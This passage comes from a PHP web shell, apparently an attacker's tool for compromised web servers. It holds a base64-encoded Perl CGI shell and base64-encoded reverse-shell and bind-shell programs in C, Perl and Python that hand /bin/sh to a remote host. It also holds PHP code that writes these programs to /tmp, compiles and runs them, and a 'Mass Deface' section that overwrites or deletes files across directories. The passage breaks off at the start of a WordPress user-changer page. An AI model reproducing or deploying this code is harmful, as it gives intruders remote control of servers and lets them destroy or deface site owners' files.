Wx0PSI8aDU+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgT3BlbiBTYW5zO2NvbG9yOiAjZmZmZmZmOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOwoJaWYgKCRlcnIpCgl7CgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOwoJfQoJZm9yZWFjaCBteSAkb25lIChAY256cykKCXsKCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQoJCXsJCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlbmFtZT0gIi9ldGMvdmFsaWFzZXMvIi4kb25lOwoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7CgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7CgkJfQoJfQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZpZXcgTG9nCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFZpZXdMb2cKewoJaWYoJFdpbk5UKQoJewoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IE9wZW4gU2Fucztjb2xvcjogI2ZmZmZmZjsnPkRvbid0IHJ1biBvbiBXaW5kb3dzPC9mb250PjwvaDI+IjsKCX0KCW15ICRyZXN1bHQ9Ijx0YWJsZT48dHI+PHRoPlBhdGggTG9nPC90aD48dGg+U3VibWl0PC90aD48L3RyPiI7CglteSBAcGF0aGxvZz0oCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLAoJCQkJJy92YXIvbG9nL2h0dHBkL2Vycm9yX2xvZycsCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nJwoJCQkJKTsKCW15ICRpPTA7CglteSAkcGVybXM7CglteSAkc2w7Cglmb3JlYWNoIG15ICRsb2cgKEBwYXRobG9nKQoJewoJCWlmKC13ICRsb2cpCgkJewoJCQkkcGVybXM9Ik9LIjsKCQl9ZWxzZQoJCXsKCQkJY2hvcCgkc2wgPSBgbG4gLXMgJGxvZyBlcnJvcl9sb2dfJGlgKTsKCQkJaWYoJnRyaW0oJGxzKSBlcSAiIikKCQkJewoJCQkJaWYoLXIgJGxzKQoJCQkJewoJCQkJCSRwZXJtcz0iT0siOwoJCQkJCSRsb2c9ImVycm9yX2xvZ18iLiRpOwoJCQkJfQoJCQl9ZWxzZQoJCQl7CgkJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+Q2FuY2VsPGZvbnQ+IjsKCQkJfQoJCX0KCQkkcmVzdWx0IC49PDxFTkQ7CgkJPHRyPgoKCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CgkJCTx0ZD48aW5wdXQgdHlwZT0idGV4dCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ18kaScpLnZhbHVlPSdsZXNzICcgKyB0aGlzLnZhbHVlOyIgdmFsdWU9IiRsb2ciIHNpemU9JzUwJy8+PC90ZD4KCQkJPHRkPjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJUcnkiIC8+PC90ZD4KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImxvZ18kaSIgbmFtZT0iYyIgdmFsdWU9Imxlc3MgJGxvZyIvPgoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCIgLz4KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIiAvPgoJCQk8L2Zvcm0+CgkJCTx0ZD4kcGVybXM8L3RkPgoKCQk8L3RyPgpFTkQKCQkkaSsrOwoJfQoJJHJlc3VsdCAuPSI8L3RhYmxlPiI7CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKJEFjdGlvbiA9ICRpbnsnYSd9OwoKJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdAoKIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZAokQ3VycmVudERpciA9ICZ0cmltKCRpbnsnZCd9KTsKIyBtYWMgZGluaCB4dWF0IHRob25nIHRpbiBuZXUga28gY28gbGVuaCBuYW8hCiRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIiBpZigkUnVuQ29tbWFuZCBlcSAiIik7CmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsKCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsKCmlmKCRBY3Rpb24gZXEgImxvZ2luIiB8fCAhJExvZ2dlZEluKSAJCSMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfWVsc2lmKCRBY3Rpb24gZXEgImd1aSIpICMgR1VJIGRpcmVjdG9yeQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJaWYoISRXaW5OVCkKCXsKCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7CgkJaWYoISgkY2htb2QgZXEgMCkpCgkJewoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7CgkJCSRmaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7CgkJCWNob3AoJHJlc3VsdD0gYGNobW9kICRjaG1vZCAiJGZpbGUiYCk7CgkJCWlmKCZ0cmltKCRyZXN1bHQpIGVxICIiKQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJCX1lbHNlCgkJCXsKCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJCX0KCQl9Cgl9CgkkcmVuYW1lPSRpbnsncmVuYW1lJ307CglpZighJHJlbmFtZSBlcSAiIikKCXsKCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkKCQl7CgkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsKCQl9ZWxzZQoJCXsKCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsKCQl9Cgl9CgkkcmVtb3ZlPSRpbnsncmVtb3ZlJ307CglpZigkcmVtb3ZlIG5lICIiKQoJewoJCSRybSA9ICRDdXJyZW50RGlyLiRQYXRoU2VwLiRyZW1vdmU7CgkJaWYoLWQgJHJtKQoJCXsKCQkJJlJtRGlyKCRybSk7CgkJfWVsc2UKCQl7CgkJCWlmKHVubGluaygkcm0pKQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJCX1lbHNlCgkJCXsKCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJCX0JCQkKCQl9Cgl9CglwcmludCAmTGlzdERpcjsKCn0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJcHJpbnQgJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInNhdmUiKQkJCQkgCSMgdXNlciB3YW50cyB0byBzYXZlIGEgZmlsZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJaWYoJlNhdmVGaWxlKCRpbnsnZGF0YSd9LCRpbnsnZmlsZSd9KSkKCXsKCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7Cgl9ZWxzZQoJewoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7Cgl9CglwcmludCAmTGlzdERpcjsKfQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAJCQkJCSMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZQcmludFBhZ2VIZWFkZXI7CgoJcHJpbnQgJlVwbG9hZEZpbGU7Cn0KZWxzaWYoJEFjdGlvbiBlcSAiYmFja2JpbmQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGJhY2sgY29ubmVjdCBvciBiaW5kIHBvcnQKewoJJlByaW50UGFnZUhlYWRlcigiY2xpZW50cG9ydCIpOwoJcHJpbnQgJkJhY2tCaW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlCnsKCSZQcmludFBhZ2VIZWFkZXI7CglwcmludCAmQnJ1dGVGb3JjZXI7Cn1lbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlCnsKCXByaW50ICZEb3dubG9hZEZpbGU7Cn1lbHNpZigkQWN0aW9uIGVxICJjaGVja2xvZyIpIAkJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsb2cgZmlsZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJlZpZXdMb2c7Cgp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluCnsKCSZQcmludFBhZ2VIZWFkZXI7CglwcmludCAmVmlld0RvbWFpblVzZXI7Cn1lbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGxvZ291dAp7CgkmUGVyZm9ybUxvZ291dDsKfQomUHJpbnRQYWdlRm9vdGVyOw==";
        $cgi = fopen($file_cgi, "w");
        fwrite($cgi, base64_decode($cgi_script));
        fwrite($htcgi, $isi_htcgi);
        chmod($file_cgi, 0755);
        chmod($memeg, 0755);
        echo "<br><center>Done ... <a href='priv_cgi/cgi.priv' target='_blank'>Click Here</a></div>";
        hardFooter();
}


// Mass Deface Section Start
function actionSql() {
        hardHeader();
        echo "<center><h1>Mass Tools</h1><div class=content><br>";

        echo "<br><center> <iframe src='?mas' width='800' height='450'></iframe></a></div>";

        hardFooter();
}

// Mass Deface Section END

// Back COnnect SEction
function actionNetwork() {
        hardHeader();
        $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
        $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
        $bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
        $pyy="IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==";
        $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
        echo "<center><h1>Network tools</h1><div class=content>
        <form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'><br>
        <span>Bind port to /bin/sh</span><br/>
        Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpp'>Perl</option><option value='bpc'>C</option></select></label> <input type=submit value='submit'>
        </form><br>
        <form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
        <span>Back-connect to</span><br/>
        Server: <input type='text' name='server' value=". $_SERVER['REMOTE_ADDR'] ."> Port: <input type='text' name='port' value='21'> Using: <label><select name='using'><option value='bcpy'>Python</option><option value='bcp'>Perl</option><option value='bcc'>C</option></select></label> <input type=submit value='submit'><br><br><br>
        </form><br>"; 
        if(isset($_POST['p1'])) {
                function cf($f,$t) {
                        $w=@fopen($f,"w") or @function_exists('file_put_contents');
                        if($w)  {
                                @fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
                                @fclose($w);
                        }
                }
                if($_POST['p1'] == 'bpc') {
                        cf("/tmp/bp.c",$bind_port_c);
                        $▖ = ex("gcc -o /tmp/bp /tmp/bp.c");
                        @unlink("/tmp/bp.c");
                        $▖ .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
                        echo "<pre class=ml1>$▖".ex("ps aux | grep bp")."</pre>";
                }
                if($_POST['p1'] == 'bpp') {
                        cf("/tmp/bp.pl",$bind_port_p);
                        $▖ = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
                        echo "<pre class=ml1>$▖".ex("ps aux | grep bp.pl")."</pre>";
                }
                if($_POST['p1'] == 'bcc') {
                        cf("/tmp/bc.c",$back_connect_c);
                        $▖ = ex("gcc -o /tmp/bc /tmp/bc.c");
                        @unlink("/tmp/bc.c");
                        $▖ .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
                        echo "<pre class=ml1>$▖".ex("ps aux | grep bc")."</pre>";
                }
                if($_POST['p1'] == 'bcp') {
                        cf("/tmp/bc.pl",$back_connect_p);
                        $▖ = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
                        echo "<pre class=ml1>$▖".ex("ps aux | grep bc.pl")."</pre>";
                }
                if($_POST['p1'] == 'bcpy') {
                        cf("/tmp/bc.py",$back_connect_p);
                        $▖ = ex(which("perl")." /tmp/bc.py ".$_POST['p2']." ".$_POST['p3']." &");
                        echo "<pre class=ml1>$▖".ex("ps aux | grep bc.py")."</pre>";
          }
        }
        echo '</div>';
        hardFooter();
}

// Back Connect Section END 


if (isset($_REQUEST['mas'])) {
    
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
echo "<center><form action=\"\" method=\"post\"> ";
function edit_file($file, $index) {
    if (is_writable($file)) {
        clear_fill($file, $index);
        echo "<Span style='color:green;'><strong> [+] Done 100% Successfull </strong></span><br></center>";
    } else {
        echo "<Span style='color:red;'><strong> [-] Failed :( </strong></span><br></center>";
    }
}
function hapus_Massal($dir, $namafile) {
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                if (file_exists("$dir/$namafile")) {
                    unlink("$dir/$namafile");
                }
            } elseif ($dirb === '..') {
                if (file_exists("" . dirname($dir) . "/$namafile")) {
                    unlink("" . dirname($dir) . "/$namafile");
                }
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        if (file_exists($lokasi)) {
                            echo "[<font color=red>DELETED</font>] $lokasi<br>";
                            unlink($lokasi);
                            $idx = hapus_Massal($dirc, $namafile);
                        }
                    }
                }
            }
        }
    }
}
function clear_fill($file, $index) {
    if (file_exists($file)) {
        $handle = fopen($file, 'w');
        fwrite($handle, '');
        fwrite($handle, $index);
        fclose($handle);
    }
}
function gass() {
    global $dirr, $index;
    chdir($dirr);
    $me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
    $files = scandir($dirr);
    $notallow = array(".htaccess", "www", "Web.Config", "UMD.php", "Web.config", "web.config", "web.Config", "..", ".");
    sort($files);
    $n = 0;
    foreach ($files as $file) {
        if ($file != $me && is_dir($file) != 1 && !in_array($file, $notallow)) {
            echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
            edit_file($file, $index);
            flush();
            $n = $n + 1;
        }
    }
    echo "<br>";
    echo "<center><br><h3>$n Files Defaced </h3></center><br> ";
}
function ListFiles($dirrall) {
    if ($dh = opendir($dirrall)) {
        $files = Array();
        $inner_files = Array();
        $me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
        $notallow = array($me, ".htaccess", "www", "Web.Config", "UMD.php", "Web.config", "web.config", "web.Config");
        while ($file = readdir($dh)) {
            if ($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow)) {
                if (is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
        }
        closedir($dh);
        return $files;
    }
}
function gass_all() {
    global $index;
    $dirrall = $_POST['d_dir'];
    foreach (ListFiles($dirrall) as $key => $file) {
        $file = str_replace('//', "/", $file);
        echo "<center><strong>$file</strong> ===>";
        edit_file($file, $index);
        flush();
    }
    $key = $key + 1;
    echo "<center><br><h3>$key Files Defaced </h3></center><br>";
}
function sabun_Massal($dir, $namafile, $isi_script) {
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                file_put_contents($lokasi, $isi_script);
            } elseif ($dirb === '..') {
                file_put_contents($lokasi, $isi_script);
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo "<font color=red>[ DONE ] </font><font color=white> $lokasi</font><br>";
                        file_put_contents($lokasi, $isi_script);
                        $idx = sabun_Massal($dirc, $namafile, $isi_script);
                    }
                }
            }
        }
    }
}
if ($_POST['Mass'] == 'onedir') {
    echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>
";
    $ini = "http://";
    $mainpath = $_POST[d_dir];
    $file = $_POST[d_file];
    $dir = opendir("$mainpath");
    $code = base64_encode($_POST[script]);
    $indx = base64_decode($code);
    while ($row = readdir($dir)) {
        $start = @fopen("$row/$file", "w+");
        $finish = @fwrite($start, $indx);
        if ($finish) {
            echo "$ini$row/$file
";
        }
    }
    echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>
";
    $mainpath = $_POST[d_dir];
    $file = $_POST[d_file];
    $dir = opendir("$mainpath");
    $code = base64_encode($_POST[script]);
    $indx = base64_decode($code);
    while ($row = readdir($dir)) {
        $start = @fopen("$row/$file", "w+");
        $finish = @fwrite($start, $indx);
        if ($finish) {
            echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>';
        }
    }
} elseif ($_POST['Mass'] == 'sabunkabeh') {
    gass();
} elseif ($_POST['Mass'] == 'hapusMassal') {
    hapus_Massal($_POST['d_dir'], $_POST['d_file']);
} elseif ($_POST['Mass'] == 'sabunmematikan') {
    gass_all();
} elseif ($_POST['Mass'] == 'Massdeface') {
    echo "<div style='margin: 5px auto; padding: 5px'>";
    sabun_Massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
    echo "</div>";
} else {
    echo "<center>              <font face='Open Sans' color='red' size='3' >Select Type:<br></font><select class=\"select\" name=\"Mass\"  style=\"width: 450px; background-color:#000000; color:#ffffff\" height=\"10\" ><option value=\"onedir\">Mass Deface 1 Dir</option> <option value=\"Massdeface\">Mass Deface ALL Dir</option><option value=\"sabunkabeh\">Current Dir All Files</option>   <option value=\"sabunmematikan\">Replace Everything With Deface</option><option value=\"hapusMassal\">Mass Delete Files</option></center></select><br><font face='Open Sans' color='red' size='3' >Folder:</font><br>  <input name='d_dir' value='" . getcwd() . "' required='' type='text' style='width: 450px; background-color:#000000; color:#ffffff' height='10'><br><font face='Open Sans' color='red' size='3' >Filename:</font><br><input type='text' name='d_file' value='index.html' style='width: 450px; background-color:#000000; color:#ffffff' height='10'><br><font face='Open Sans' color='red'  size='3' >Index File:</font><br>

        <textarea name='script' style='width: 450px; height: 200px; background-color:#000000; color:#ffffff '>    </textarea><br>

        <input type='submit' name='start' value='Mass Deface' style='width: 200px;'></form></center></div>";
}
    die;
}

if (isset($_REQUEST['user'])) {
echo"<html><head><title>Priv8 Shell Wp Mass User Changer</title></head>
<style>
@import 'https://fonts.googleapis.com/css?family=Open+Sans';

h1{
        color:#16a085;
        text-shadow:0 0 5px;
        font-family: Open Sans;
}
#gter{
        position: absolute;
